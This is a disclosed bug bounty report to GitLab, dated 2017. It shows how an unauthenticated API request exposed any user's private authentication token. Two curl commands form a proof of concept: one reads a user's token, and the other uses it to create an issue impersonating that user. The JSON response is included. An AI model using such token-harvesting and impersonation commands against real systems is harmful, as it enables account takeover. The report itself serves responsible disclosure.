# all private tokens are leaked to an unauthenticated attacker

## Report Details
- **Report ID**: 268794
- **URL**: https://hackerone.com/reports/268794
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2017-09-15T22:13:20.680Z
- **Disclosed**: 2017-09-21T13:55:55.437Z

## Reporter
- **Username**: rpearl
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
Using the api, one can obtain the authentication token for any user on gitlab:
```
$ curl -s --request GET https://gitlab.com/api/v4/users/951422 | jq '.authentication_token'
"[redacted]"
```

We can then use this token to impersonate any user to perform any action they can perform:
```$ curl --request POST --header "PRIVATE-TOKEN: [redacted]" https://gitlab.com/api/v4/projects/3831210/issues?title=owned```

```
{"id":6843690,"iid":4,"project_id":3831210,"title":"owned","description":"","state":"opened","created_at":"2017-09-15T21:58:06.342Z","updated_at":"2017-09-15T21:58:06.342Z","labels":[],"milestone":null,"assignees":[],"author":{"id":951422,"name":"Andrew Drake","username":"adrake","state":"active","avatar_url":"https://secure.gravatar.com/avatar/5cd00179addefbca6d635845534a1ee6?s=80&d=identicon","web_url":"https://gitlab.com/adrake"},"assignee":null,"user_notes_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"weight":null,"web_url":"https://gitlab.com/karmiclabs/slabricator/issues/4","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"_links":{"self":"http://gitlab.com/api/v4/projects/3831210/issues/4","notes":"http://gitlab.com/api/v4/projects/3831210/issues/4/notes","award_emoji":"http://gitlab.com/api/v4/projects/3831210/issues/4/award_emoji","project":"http://gitlab.com/api/v4/projects/3831210"},"subscribed":true}
```



## Attachments
No attachments
